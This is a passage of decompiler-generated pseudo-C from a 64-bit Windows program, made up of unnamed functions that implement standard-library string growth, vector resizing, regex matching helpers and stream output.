    memcpy(_Dst_00,param_1,(size_t)pvVar6);
    memcpy(_Dst,param_4,param_5);
    *(undefined *)((longlong)_Dst + param_5) = 0;
  }
  else {
    _Src = *param_1;
    memcpy(_Dst_00,_Src,(size_t)pvVar6);
    memcpy(_Dst,param_4,param_5);
    *(undefined *)((longlong)_Dst + param_5) = 0;
    pvVar6 = _Src;
    if (((undefined *)0xfff < puVar1 + 1) &&
       (pvVar6 = *(void **)((longlong)_Src + -8),
       0x1f < (ulonglong)((longlong)_Src + (-8 - (longlong)pvVar6)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(pvVar6);
  }
  *param_1 = _Dst_00;
  return param_1;
}



void ** FUN_140003b30(void **param_1,ulonglong param_2)

{
  undefined *puVar1;
  void *_Src;
  code *pcVar2;
  void *_Dst;
  void **ppvVar3;
  undefined *puVar4;
  undefined *puVar5;
  void *pvVar6;
  
  pvVar6 = param_1[2];
  puVar5 = (undefined *)0x7fffffffffffffff;
  if (0x7fffffffffffffffU - (longlong)pvVar6 < param_2) {
    FUN_14000ba60();
    pcVar2 = (code *)swi(3);
    ppvVar3 = (void **)(*pcVar2)();
    return ppvVar3;
  }
  puVar1 = (undefined *)param_1[3];
  puVar4 = (undefined *)((ulonglong)(void *)((longlong)pvVar6 + param_2) | 0xf);
  if ((puVar4 < (undefined *)0x8000000000000000) &&
     (puVar1 <= (undefined *)(0x7fffffffffffffff - ((ulonglong)puVar1 >> 1)))) {
    puVar5 = puVar4;
    if (puVar4 < puVar1 + ((ulonglong)puVar1 >> 1)) {
      puVar5 = puVar1 + ((ulonglong)puVar1 >> 1);
    }
    puVar4 = puVar5 + 1;
    if (puVar4 < (undefined *)0x1000) {
      _Dst = (void *)0x0;
      if (puVar4 != (undefined *)0x0) {
        _Dst = operator_new((__uint64)puVar4);
      }
      goto LAB_140003bca;
    }
  }
  else {
    puVar4 = (undefined *)0x8000000000000000;
  }
  _Dst = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_
                   ((__uint64)puVar4);
LAB_140003bca:
  param_1[2] = (void *)((longlong)pvVar6 + param_2);
  param_1[3] = puVar5;
  if (puVar1 < &DAT_00000010) {
    memcpy(_Dst,param_1,(longlong)pvVar6 + 1U);
  }
  else {
    _Src = *param_1;
    memcpy(_Dst,_Src,(longlong)pvVar6 + 1U);
    pvVar6 = _Src;
    if (((undefined *)0xfff < puVar1 + 1) &&
       (pvVar6 = *(void **)((longlong)_Src + -8),
       0x1f < (ulonglong)((longlong)_Src + (-8 - (longlong)pvVar6)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(pvVar6);
  }
  *param_1 = _Dst;
  return param_1;
}



void ** FUN_140003c50(void **param_1,ulonglong param_2,undefined8 param_3,longlong param_4,
                     undefined2 param_5)

{
  void *pvVar1;
  void *pvVar2;
  code *pcVar3;
  size_t _Size;
  void *_Dst;
  void **ppvVar4;
  __uint64 _Var5;
  longlong lVar6;
  void *pvVar7;
  void *pvVar8;
  void *pvVar9;
  undefined2 *puVar10;
  
  pvVar8 = param_1[2];
  pvVar9 = (void *)0x7ffffffffffffffe;
  if (0x7ffffffffffffffeU - (longlong)pvVar8 < param_2) {
    FUN_14000ba60();
    pcVar3 = (code *)swi(3);
    ppvVar4 = (void **)(*pcVar3)();
    return ppvVar4;
  }
  pvVar2 = param_1[3];
  _Dst = (void *)0x0;
  pvVar7 = (void *)((ulonglong)(void *)((longlong)pvVar8 + param_2) | 7);
  if ((pvVar7 < (void *)0x7fffffffffffffff) &&
     (pvVar2 <= (void *)(0x7ffffffffffffffe - ((ulonglong)pvVar2 >> 1)))) {
    pvVar1 = (void *)(((ulonglong)pvVar2 >> 1) + (longlong)pvVar2);
    pvVar9 = pvVar7;
    if (pvVar7 < pvVar1) {
      pvVar9 = pvVar1;
    }
    if (0x7fffffffffffffff < (longlong)pvVar9 + 1U) {
      FUN_14000b454();
      pcVar3 = (code *)swi(3);
      ppvVar4 = (void **)(*pcVar3)();
      return ppvVar4;
    }
    _Var5 = ((longlong)pvVar9 + 1U) * 2;
    if (_Var5 < 0x1000) {
      if (_Var5 != 0) {
        _Dst = operator_new(_Var5);
      }
      goto LAB_140003d11;
    }
  }
  else {
    _Var5 = 0xfffffffffffffffe;
  }
  _Dst = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_(_Var5);
LAB_140003d11:
  param_1[3] = pvVar9;
  _Size = (longlong)pvVar8 * 2;
  param_1[2] = (void *)((longlong)pvVar8 + param_2);
  puVar10 = (undefined2 *)(_Size + (longlong)_Dst);
  if (pvVar2 < (void *)0x8) {
    memcpy(_Dst,param_1,_Size);
    lVar6 = param_4;
    if (param_4 != 0) {
      for (; lVar6 != 0; lVar6 = lVar6 + -1) {
        *puVar10 = param_5;
        puVar10 = puVar10 + 1;
      }
    }
    *(undefined2 *)((longlong)_Dst + ((longlong)pvVar8 + param_4) * 2) = 0;
  }
  else {
    pvVar9 = *param_1;
    memcpy(_Dst,pvVar9,_Size);
    lVar6 = param_4;
    if (param_4 != 0) {
      for (; lVar6 != 0; lVar6 = lVar6 + -1) {
        *puVar10 = param_5;
        puVar10 = puVar10 + 1;
      }
    }
    *(undefined2 *)((longlong)_Dst + ((longlong)pvVar8 + param_4) * 2) = 0;
    pvVar8 = pvVar9;
    if ((0xfff < (longlong)pvVar2 * 2 + 2U) &&
       (pvVar8 = *(void **)((longlong)pvVar9 + -8),
       0x1f < (ulonglong)((longlong)pvVar9 + (-8 - (longlong)pvVar8)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(pvVar8);
  }
  *param_1 = _Dst;
  return param_1;
}



void ** FUN_140003dd8(void **param_1,ulonglong param_2,undefined8 param_3,size_t param_4,
                     char param_5)

{
  void *_Dst;
  undefined *puVar1;
  void *_Src;
  code *pcVar2;
  void *_Dst_00;
  void **ppvVar3;
  undefined *puVar4;
  undefined *puVar5;
  void *pvVar6;
  
  pvVar6 = param_1[2];
  puVar5 = (undefined *)0x7fffffffffffffff;
  if (0x7fffffffffffffffU - (longlong)pvVar6 < param_2) {
    FUN_14000ba60();
    pcVar2 = (code *)swi(3);
    ppvVar3 = (void **)(*pcVar2)();
    return ppvVar3;
  }
  puVar1 = (undefined *)param_1[3];
  puVar4 = (undefined *)((ulonglong)(void *)((longlong)pvVar6 + param_2) | 0xf);
  if ((puVar4 < (undefined *)0x8000000000000000) &&
     (puVar1 <= (undefined *)(0x7fffffffffffffff - ((ulonglong)puVar1 >> 1)))) {
    puVar5 = puVar4;
    if (puVar4 < puVar1 + ((ulonglong)puVar1 >> 1)) {
      puVar5 = puVar1 + ((ulonglong)puVar1 >> 1);
    }
    puVar4 = puVar5 + 1;
    if (puVar4 < (undefined *)0x1000) {
      if (puVar4 == (undefined *)0x0) {
        _Dst_00 = (void *)0x0;
      }
      else {
        _Dst_00 = operator_new((__uint64)puVar4);
      }
      goto LAB_140003e7b;
    }
  }
  else {
    puVar4 = (undefined *)0x8000000000000000;
  }
  _Dst_00 = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_
                      ((__uint64)puVar4);
LAB_140003e7b:
  param_1[2] = (void *)((longlong)pvVar6 + param_2);
  _Dst = (void *)((longlong)_Dst_00 + (longlong)pvVar6);
  param_1[3] = puVar5;
  if (puVar1 < &DAT_00000010) {
    memcpy(_Dst_00,param_1,(size_t)pvVar6);
    memset(_Dst,(int)param_5,param_4);
    *(undefined *)((longlong)_Dst + param_4) = 0;
  }
  else {
    _Src = *param_1;
    memcpy(_Dst_00,_Src,(size_t)pvVar6);
    memset(_Dst,(int)param_5,param_4);
    *(undefined *)((longlong)_Dst + param_4) = 0;
    pvVar6 = _Src;
    if (((undefined *)0xfff < puVar1 + 1) &&
       (pvVar6 = *(void **)((longlong)_Src + -8),
       0x1f < (ulonglong)((longlong)_Src + (-8 - (longlong)pvVar6)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(pvVar6);
  }
  *param_1 = _Dst_00;
  return param_1;
}



// WARNING: Could not reconcile some variable overlaps

undefined8 *
FUN_140003f34(undefined8 *param_1,void **param_2,byte *param_3,byte *param_4,longlong *param_5,
             undefined8 *param_6,uint param_7)

{
  longlong lVar1;
  uint uVar2;
  undefined *puVar3;
  undefined8 *puVar4;
  longlong *plVar5;
  longlong lVar6;
  undefined8 *puVar7;
  uint uVar8;
  undefined8 local_res18;
  byte *local_res20;
  byte *local_b8;
  undefined local_b0;
  undefined local_a8 [16];
  undefined local_98 [16];
  undefined *local_88;
  undefined local_80;
  undefined local_78 [16];
  undefined local_68;
  longlong local_60;
  undefined8 local_58;
  undefined local_50;
  undefined8 local_48;
  undefined8 local_40;
  
  local_b8 = (byte *)0x0;
  local_b0 = 0;
  local_a8 = ZEXT816(0);
  local_98 = ZEXT816(0);
  local_88 = (undefined *)0x0;
  local_80 = 0;
  local_78 = ZEXT816(0);
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  local_res20 = param_4;
  puVar3 = FUN_140004198(param_3,param_4,&local_b8,param_5,param_7,param_3);
  if ((char)puVar3 != '\0') {
    uVar8 = param_7;
    do {
      if ((param_7 & 0x800) == 0) {
        puVar4 = FUN_14000280c(&local_res18,local_98._8_8_,local_88,param_2);
        param_2 = (void **)*puVar4;
      }
      puVar4 = param_6;
      if (0xf < (ulonglong)param_6[3]) {
        puVar4 = (undefined8 *)*param_6;
      }
      puVar7 = param_6;
      if (0xf < (ulonglong)param_6[3]) {
        puVar7 = (undefined8 *)*param_6;
      }
      if ((uVar8 >> 10 & 1) == 0) {
        puVar4 = FUN_140002a24(&local_40,(longlong)&local_b8,param_2,(char *)puVar7,
                               (char *)(param_6[2] + (longlong)puVar4));
      }
      else {
        puVar4 = FUN_140002d2c(&local_48,(longlong)&local_b8,param_2,(char *)puVar7,
                               (char *)(param_6[2] + (longlong)puVar4));
      }
      param_2 = (void **)*puVar4;
      lVar1 = local_a8._8_8_ - (longlong)local_a8._0_8_ >> 0x3f;
      lVar6 = (local_a8._8_8_ - (longlong)local_a8._0_8_) / 0x18 + lVar1;
      plVar5 = &local_60;
      if (lVar6 != lVar1) {
        plVar5 = local_a8._0_8_;
      }
      param_3 = (byte *)plVar5[1];
      if ((param_3 == local_res20) || ((param_7 >> 0xc & 1) != 0)) goto LAB_1400040f4;
      if (lVar6 == lVar1) {
        local_a8._0_8_ = &local_60;
      }
      if (*local_a8._0_8_ != local_a8._0_8_[1]) {
        uVar8 = uVar8 | 0x100;
      }
      uVar2 = 0x2000;
      if (*local_a8._0_8_ != local_a8._0_8_[1]) {
        uVar2 = 0;
      }
      puVar3 = FUN_140004198(param_3,local_res20,&local_b8,param_5,uVar2 | uVar8,param_3);
    } while ((char)puVar3 != '\0');
  }
LAB_1400040f4:
  if ((param_7 >> 0xb & 1) == 0) {
    puVar4 = FUN_14000280c(&local_res18,param_3,local_res20,param_2);
    param_2 = (void **)*puVar4;
  }
  *param_1 = param_2;
  if (local_a8._0_8_ != (longlong *)0x0) {
    plVar5 = local_a8._0_8_;
    if ((0xfff < (ulonglong)(((local_98._0_8_ - (longlong)local_a8._0_8_) / 0x18) * 0x18)) &&
       (plVar5 = (longlong *)local_a8._0_8_[-1],
       0x1f < (ulonglong)((longlong)local_a8._0_8_ + (-8 - (longlong)plVar5)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(plVar5);
  }
  return param_1;
}



undefined *
FUN_140004198(byte *param_1,byte *param_2,byte **param_3,longlong *param_4,uint param_5,
             byte *param_6)

{
  longlong lVar1;
  ulonglong uVar2;
  byte bVar3;
  byte *pbVar4;
  byte *local_108 [21];
  byte *local_60;
  uint local_4c;
  
  lVar1 = *param_4;
  if (lVar1 == 0) {
    return &stack0x00000000;
  }
  bVar3 = 0;
  pbVar4 = param_1;
  if (((param_5 >> 0xe & 1) != 0) && (param_1 != param_2)) {
    pbVar4 = param_1 + 1;
  }
  FUN_140005098((longlong)local_108,pbVar4,param_2,param_4 + 1,lVar1,*(undefined4 *)(lVar1 + 0x28),
                *(undefined4 *)(lVar1 + 0x20),param_5);
  uVar2 = FUN_14000316c(local_108,param_3,0);
  if ((char)uVar2 == '\0') {
    if ((pbVar4 == param_2) || ((param_5 & 0x40) != 0)) goto LAB_1400042c9;
    local_4c = local_4c & 0xffffdfff | 0x100;
    do {
      pbVar4 = FUN_14000b1f0((longlong)local_108,pbVar4 + 1,param_2,0);
      if (pbVar4 == param_2) {
        local_60 = param_2;
        uVar2 = FUN_14000316c(local_108,param_3,0);
        if ((char)uVar2 == '\0') goto LAB_1400042c9;
        break;
      }
      local_60 = pbVar4;
      uVar2 = FUN_14000316c(local_108,param_3,0);
    } while ((char)uVar2 == '\0');
  }
  bVar3 = 1;
  if (param_3 != (byte **)0x0) {
    *param_3 = param_6;
    param_3[5] = param_1;
    *(bool *)(param_3 + 7) = param_1 != param_3[6];
  }
LAB_1400042c9:
  uVar2 = FUN_140005d18((longlong)local_108);
  return (undefined *)(uVar2 & 0xffffffffffffff00 | (ulonglong)bVar3);
}



void FUN_1400042f8(longlong *param_1,char *param_2,char *param_3,uint param_4)

{
  int *piVar1;
  int iVar2;
  undefined8 *puVar3;
  longlong lVar4;
  void *_Memory;
  undefined8 *puVar5;
  char *local_98 [4];
  void *local_78;
  longlong local_68;
  
  FUN_140005168(local_98,(char *)(param_1 + 1),param_2,param_3,param_4);
  lVar4 = FUN_1400091b8(local_98);
  if (lVar4 != 0) {
    LOCK();
    *(int *)(lVar4 + 0x2c) = *(int *)(lVar4 + 0x2c) + 1;
  }
  if (*param_1 != 0) {
    LOCK();
    piVar1 = (int *)(*param_1 + 0x2c);
    iVar2 = *piVar1;
    *piVar1 = *piVar1 + -1;
    if (iVar2 == 1) {
      puVar5 = (undefined8 *)*param_1;
      while (puVar5 != (undefined8 *)0x0) {
        puVar3 = (undefined8 *)puVar5[2];
        puVar5[2] = 0;
        (**(code **)*puVar5)(puVar5,1);
        puVar5 = puVar3;
      }
    }
  }
  *param_1 = lVar4;
  if (local_78 != (void *)0x0) {
    _Memory = local_78;
    if ((0xfff < (local_68 - (longlong)local_78 & 0xfffffffffffffffcU)) &&
       (_Memory = *(void **)((longlong)local_78 + -8),
       0x1f < (ulonglong)((longlong)local_78 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
  }
  return;
}



void FUN_1400043d4(void **param_1,ulonglong param_2,undefined4 *param_3)

{
  void *pvVar1;
  uint uVar2;
  ulonglong uVar3;
  longlong lVar4;
  undefined4 *puVar5;
  
  puVar5 = (undefined4 *)param_1[1];
  pvVar1 = *param_1;
  uVar3 = (longlong)puVar5 - (longlong)pvVar1 >> 2;
  if (param_2 < uVar3) {
    param_1[1] = (void *)((longlong)pvVar1 + param_2 * 4);
  }
  else if (uVar3 < param_2) {
    if ((ulonglong)((longlong)param_1[2] - (longlong)pvVar1 >> 2) < param_2) {
      FUN_1400045bc(param_1,param_2,param_3);
    }
    else {
      lVar4 = param_2 - uVar3;
      uVar2 = FUN_1400030a4(param_3);
      if ((char)uVar2 == '\0') {
        for (; lVar4 != 0; lVar4 = lVar4 + -1) {
          *puVar5 = *param_3;
          puVar5 = puVar5 + 1;
        }
      }
      else {
        FUN_140002a14(puVar5,lVar4);
        puVar5 = puVar5 + lVar4;
      }
      param_1[1] = puVar5;
    }
  }
  return;
}



void FUN_140004480(void **param_1,ulonglong param_2)

{
  ulonglong uVar1;
  longlong lVar2;
  void *_Dst;
  
  _Dst = param_1[1];
  uVar1 = (longlong)_Dst - (longlong)*param_1 >> 4;
  if (param_2 < uVar1) {
    param_1[1] = (void *)(param_2 * 0x10 + (longlong)*param_1);
  }
  else if (uVar1 < param_2) {
    if ((ulonglong)((longlong)param_1[2] - (longlong)*param_1 >> 4) < param_2) {
      FUN_1400046fc(param_1,param_2);
    }
    else {
      lVar2 = param_2 - uVar1;
      if (lVar2 != 0) {
        memset(_Dst,0,lVar2 * 0x10);
        _Dst = (void *)((longlong)_Dst + lVar2 * 0x10);
      }
      param_1[1] = _Dst;
    }
  }
  return;
}



void FUN_140004504(void **param_1,ulonglong param_2)

{
  void *pvVar1;
  longlong lVar2;
  ulonglong uVar3;
  undefined8 *puVar4;
  
  puVar4 = (undefined8 *)param_1[1];
  pvVar1 = *param_1;
  lVar2 = ((longlong)puVar4 - (longlong)pvVar1) / 6 + ((longlong)puVar4 - (longlong)pvVar1 >> 0x3f);
  uVar3 = (lVar2 >> 2) - (lVar2 >> 0x3f);
  if (param_2 < uVar3) {
    param_1[1] = (void *)((longlong)pvVar1 + param_2 * 0x18);
  }
  else if (uVar3 < param_2) {
    if ((ulonglong)(((longlong)param_1[2] - (longlong)pvVar1) / 0x18) < param_2) {
      FUN_14000480c(param_1,param_2);
    }
    else {
      for (lVar2 = param_2 - uVar3; lVar2 != 0; lVar2 = lVar2 + -1) {
        *puVar4 = 0;
        puVar4[1] = 0;
        *(undefined *)(puVar4 + 2) = 0;
        puVar4 = puVar4 + 3;
      }
      param_1[1] = puVar4;
    }
  }
  return;
}



void FUN_1400045bc(void **param_1,ulonglong param_2,undefined4 *param_3)

{
  undefined4 *puVar1;
  void *pvVar2;
  code *pcVar3;
  uint uVar4;
  void *pvVar5;
  ulonglong uVar6;
  void *_Memory;
  ulonglong uVar7;
  longlong lVar8;
  
  uVar7 = 0x3fffffffffffffff;
  if (0x3fffffffffffffff < param_2) {
    FUN_14000ba74();
    pcVar3 = (code *)swi(3);
    (*pcVar3)();
    return;
  }
  lVar8 = (longlong)param_1[1] - (longlong)*param_1 >> 2;
  uVar6 = (longlong)param_1[2] - (longlong)*param_1 >> 2;
  if (0x3fffffffffffffff - (uVar6 >> 1) < uVar6) {
    uVar6 = 0xfffffffffffffffc;
  }
  else {
    uVar6 = (uVar6 >> 1) + uVar6;
    uVar7 = param_2;
    if ((param_2 <= uVar6) && (uVar7 = uVar6, 0x3fffffffffffffff < uVar6)) {
      FUN_14000b454();
      pcVar3 = (code *)swi(3);
      (*pcVar3)();
      return;
    }
    uVar6 = uVar7 * 4;
    if (uVar6 < 0x1000) {
      if (uVar6 == 0) {
        pvVar5 = (void *)0x0;
      }
      else {
        pvVar5 = operator_new(uVar6);
      }
      goto LAB_14000467d;
    }
  }
  pvVar5 = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_(uVar6);
LAB_14000467d:
  puVar1 = (undefined4 *)((longlong)pvVar5 + lVar8 * 4);
  lVar8 = param_2 - lVar8;
  uVar4 = FUN_1400030a4(param_3);
  if ((char)uVar4 == '\0') {
    for (; lVar8 != 0; lVar8 = lVar8 + -1) {
      *puVar1 = *param_3;
      puVar1 = puVar1 + 1;
    }
  }
  else {
    FUN_140002a14(puVar1,lVar8);
  }
  FUN_1400027c4(*param_1,(longlong)param_1[1],pvVar5);
  pvVar2 = *param_1;
  if (pvVar2 != (void *)0x0) {
    _Memory = pvVar2;
    if ((0xfff < ((longlong)param_1[2] - (longlong)pvVar2 & 0xfffffffffffffffcU)) &&
       (_Memory = *(void **)((longlong)pvVar2 + -8),
       0x1f < (ulonglong)((longlong)pvVar2 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
  }
  *param_1 = pvVar5;
  param_1[1] = (void *)((longlong)pvVar5 + param_2 * 4);
  param_1[2] = (void *)((longlong)pvVar5 + uVar7 * 4);
  return;
}



void FUN_1400046fc(void **param_1,ulonglong param_2)

{
  void *pvVar1;
  code *pcVar2;
  void *pvVar3;
  ulonglong uVar4;
  __uint64 _Var5;
  void *_Memory;
  ulonglong uVar6;
  longlong lVar7;
  longlong lVar8;
  
  uVar6 = 0xfffffffffffffff;
  if (0xfffffffffffffff < param_2) {
    FUN_14000ba74();
    pcVar2 = (code *)swi(3);
    (*pcVar2)();
    return;
  }
  lVar8 = (longlong)param_1[1] - (longlong)*param_1 >> 4;
  uVar4 = (longlong)param_1[2] - (longlong)*param_1 >> 4;
  if (0xfffffffffffffff - (uVar4 >> 1) < uVar4) {
    _Var5 = 0xfffffffffffffff0;
  }
  else {
    uVar4 = (uVar4 >> 1) + uVar4;
    uVar6 = param_2;
    if ((param_2 <= uVar4) && (uVar6 = uVar4, 0xfffffffffffffff < uVar4)) {
      FUN_14000b454();
      pcVar2 = (code *)swi(3);
      (*pcVar2)();
      return;
    }
    _Var5 = uVar6 << 4;
    if (_Var5 < 0x1000) {
      pvVar3 = (void *)0x0;
      if (_Var5 != 0) {
        pvVar3 = operator_new(_Var5);
      }
      goto LAB_1400047b4;
    }
  }
  pvVar3 = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_(_Var5);
LAB_1400047b4:
  lVar7 = param_2 - lVar8;
  if (lVar7 != 0) {
    memset((void *)(lVar8 * 0x10 + (longlong)pvVar3),0,lVar7 * 0x10);
  }
  FUN_1400027c4(*param_1,(longlong)param_1[1],pvVar3);
  pvVar1 = *param_1;
  if (pvVar1 != (void *)0x0) {
    _Memory = pvVar1;
    if ((0xfff < ((longlong)param_1[2] - (longlong)pvVar1 & 0xfffffffffffffff0U)) &&
       (_Memory = *(void **)((longlong)pvVar1 + -8),
       0x1f < (ulonglong)((longlong)pvVar1 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
  }
  *param_1 = pvVar3;
  param_1[1] = (void *)(param_2 * 0x10 + (longlong)pvVar3);
  param_1[2] = (void *)(uVar6 * 0x10 + (longlong)pvVar3);
  return;
}



void FUN_14000480c(void **param_1,ulonglong param_2)

{
  ulonglong uVar1;
  void *pvVar2;
  code *pcVar3;
  void *pvVar4;
  undefined *puVar5;
  __uint64 _Var6;
  longlong lVar7;
  void *_Memory;
  longlong lVar8;
  ulonglong uVar9;
  
  uVar9 = 0xaaaaaaaaaaaaaaa;
  if (0xaaaaaaaaaaaaaaa < param_2) {
    FUN_14000ba74();
    pcVar3 = (code *)swi(3);
    (*pcVar3)();
    return;
  }
  lVar8 = ((longlong)param_1[1] - (longlong)*param_1) / 6 +
          ((longlong)param_1[1] - (longlong)*param_1 >> 0x3f);
  lVar8 = (lVar8 >> 2) - (lVar8 >> 0x3f);
  uVar1 = ((longlong)param_1[2] - (longlong)*param_1) / 0x18;
  if (0xaaaaaaaaaaaaaaa - (uVar1 >> 1) < uVar1) {
    _Var6 = 0xfffffffffffffff0;
  }
  else {
    uVar1 = (uVar1 >> 1) + uVar1;
    uVar9 = param_2;
    if ((param_2 <= uVar1) && (uVar9 = uVar1, 0xaaaaaaaaaaaaaaa < uVar1)) {
      FUN_14000b454();
      pcVar3 = (code *)swi(3);
      (*pcVar3)();
      return;
    }
    _Var6 = uVar9 * 0x18;
    if (_Var6 < 0x1000) {
      if (_Var6 == 0) {
        pvVar4 = (void *)0x0;
      }
      else {
        pvVar4 = operator_new(_Var6);
      }
      goto LAB_1400048f2;
    }
  }
  pvVar4 = std::_Allocate_manually_vector_aligned_struct_std___Default_allocate_traits_(_Var6);
LAB_1400048f2:
  lVar7 = param_2 - lVar8;
  if (lVar7 != 0) {
    puVar5 = (undefined *)((longlong)pvVar4 + lVar8 * 0x18 + 0x10);
    do {
      *(undefined8 *)(puVar5 + -0x10) = 0;
      *(undefined8 *)(puVar5 + -8) = 0;
      *puVar5 = 0;
      puVar5 = puVar5 + 0x18;
      lVar7 = lVar7 + -1;
    } while (lVar7 != 0);
  }
  FUN_1400027c4(*param_1,(longlong)param_1[1],pvVar4);
  pvVar2 = *param_1;
  if (pvVar2 != (void *)0x0) {
    _Memory = pvVar2;
    if ((0xfff < (ulonglong)((((longlong)param_1[2] - (longlong)pvVar2) / 0x18) * 0x18)) &&
       (_Memory = *(void **)((longlong)pvVar2 + -8),
       0x1f < (ulonglong)((longlong)pvVar2 + (-8 - (longlong)_Memory)))) {
                    // WARNING: Subroutine does not return
      _invalid_parameter_noinfo_noreturn();
    }
    free(_Memory);
  }
  *param_1 = pvVar4;
  param_1[1] = (void *)((longlong)pvVar4 + param_2 * 0x18);
  param_1[2] = (void *)((longlong)pvVar4 + uVar9 * 0x18);
  return;
}



longlong * FUN_140004958(longlong *param_1,longlong param_2)

{
  longlong lVar1;
  
  *param_1 = param_2;
  lVar1 = -1;
  do {
    lVar1 = lVar1 + 1;
  } while (*(char *)(param_2 + lVar1) != '\0');
  param_1[1] = lVar1;
  return param_1;
}



undefined8 * FUN_140004970(undefined8 *param_1,undefined8 *param_2)

{
  undefined8 *puVar1;
  
  puVar1 = param_2 + 2;
  if (0xf < (ulonglong)param_2[3]) {
    param_2 = (undefined8 *)*param_2;
  }
  param_1[1] = *puVar1;
  *param_1 = param_2;
  return param_1;
}



longlong * FUN_14000498c(longlong *param_1,longlong *param_2)

{
  longlong lVar1;
  longlong lVar2;
  
  lVar1 = *param_2;
  lVar2 = -1;
  *param_1 = lVar1;
  do {
    lVar2 = lVar2 + 1;
  } while (*(char *)(lVar1 + lVar2) != '\0');
  param_1[1] = lVar2;
  return param_1;
}



undefined4 FUN_1400049a8(void *param_1)

{
  undefined4 local_res10 [6];
  
  memcpy(local_res10,param_1,4);
  return local_res10[0];
}



longlong * FUN_1400049c8(undefined8 *param_1,undefined8 *param_2,longlong *param_3)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  longlong *plVar3;
  
  if (param_1 != param_2) {
    puVar2 = param_1 + 5;
    plVar3 = param_3;
    do {
      FUN_1400053ac(param_3,puVar2 + -5,(uint)plVar3);
      *(undefined (*) [16])(param_3 + 5) = ZEXT816(0);
      param_3[7] = 0;
      param_3[8] = 0;
      puVar1 = puVar2;
      if (0xf < (ulonglong)puVar2[3]) {
        puVar1 = (undefined8 *)*puVar2;
      }
      plVar3 = (longlong *)puVar2[2];
      FUN_140001e44((void **)(undefined (*) [16])(param_3 + 5),puVar1,(undefined *)plVar3);
      param_3 = param_3 + 9;
      puVar1 = puVar2 + 4;
      puVar2 = puVar2 + 9;
    } while (puVar1 != param_2);
  }
  return param_3;
}



longlong * FUN_140004a5c(longlong *param_1)

{
  char cVar1;
  
  cVar1 = std::basic_ios<char,struct_std::char_traits<char>_>::widen
                    ((basic_ios_char_struct_std__char_traits_char___ *)
                     ((longlong)*(int *)(*param_1 + 4) + (longlong)param_1),'\n');
  std::basic_ostream<char,struct_std::char_traits<char>_>::put
            ((basic_ostream_char_struct_std__char_traits_char___ *)param_1,cVar1);
  std::basic_ostream<char,struct_std::char_traits<char>_>::flush
            ((basic_ostream_char_struct_std__char_traits_char___ *)param_1);
  return param_1;
}



undefined FUN_140004a94(char *param_1,char *param_2,longlong param_3,longlong param_4)

{
  char cVar1;
  char cVar2;
  longlong lVar3;
  
  if (param_1 != param_2) {
    lVar3 = param_3 - (longlong)param_1;
    do {
      cVar2 = *param_1;
      cVar1 = std::ctype<char>::tolower(*(ctype_char_ **)(param_4 + 8),param_1[lVar3]);
      cVar2 = std::ctype<char>::tolower(*(ctype_char_ **)(param_4 + 8),cVar2);
      if (cVar2 != cVar1) {
        return 0;
      }
      param_1 = param_1 + 1;
    } while (param_1 != param_2);
  }
  return 1;
}



ushort FUN_140004b10(longlong param_1,char *param_2,char *param_3,char param_4)

{
  char cVar1;
  ushort uVar2;
  ulonglong uVar3;
  ulonglong uVar4;
  char *pcVar5;
  
  uVar3 = 0;
  pcVar5 = "alnum";
  uVar4 = uVar3;
  do {
    if (((longlong)param_3 - (longlong)param_2 ==
         (ulonglong)*(uint *)((longlong)&DAT_140011b90 + uVar3)) &&
       (cVar1 = FUN_140004a94(param_2,param_3,(longlong)pcVar5,param_1), cVar1 != '\0')) break;
    uVar4 = (ulonglong)((int)uVar4 + 1);
    uVar3 = uVar4 * 0x18;
    pcVar5 = (&PTR_s_alnum_140011b80)[uVar4 * 3];
  } while (pcVar5 != (char *)0x0);
  uVar2 = 0;
  if ((&PTR_s_alnum_140011b80)[uVar4 * 3] != (undefined *)0x0) {
    uVar2 = *(ushort *)(&UNK_140011b94 + uVar4 * 0x18);
  }
  if ((param_4 != '\0') && ((uVar2 & 3) != 0)) {
    uVar2 = uVar2 | 3;
  }
  return uVar2;
}



undefined8 *
FUN_140004bd0(undefined8 *param_1,void **param_2,byte *param_3,byte *param_4,longlong *param_5,
             undefined8 *param_6,uint param_7)

{
  undefined8 *puVar1;
  undefined8 local_res8 [4];
  
  puVar1 = FUN_140003f34(local_res8,param_2,param_3,param_4,param_5,param_6,param_7);
  *param_1 = *puVar1;
  return param_1;
}



undefined (*) [16]
FUN_140004c14(undefined (*param_1) [16],undefined8 *param_2,longlong *param_3,undefined8 *param_4,
             uint param_5)

{
  longlong *plVar1;
  undefined8 *puVar2;
  undefined8 local_res10 [3];
  
  *param_1 = ZEXT816(0);
  *(undefined8 *)param_1[1] = 0;
  *(undefined8 *)(param_1[1] + 8) = 0xf;
  (*param_1)[0] = 0;
  puVar2 = param_2;
  if (0xf < (ulonglong)param_2[3]) {
    puVar2 = (undefined8 *)*param_2;
  }
  plVar1 = param_2 + 2;
  if (0xf < (ulonglong)param_2[3]) {
    param_2 = (undefined8 *)*param_2;
  }
  FUN_140004bd0(local_res10,(void **)param_1,(byte *)param_2,(byte *)(*plVar1 + (longlong)puVar2),
                param_3,param_4,param_5);
  return param_1;
}



void FUN_140004c94(longlong **param_1,void **param_2,void *param_3,void *param_4)

{
  char *pcVar1;
  void *pvVar2;
  void *pvVar3;
  char *pcVar4;
  undefined auStack168 [32];
  undefined4 local_88;
  void *local_80;
  void *local_78;
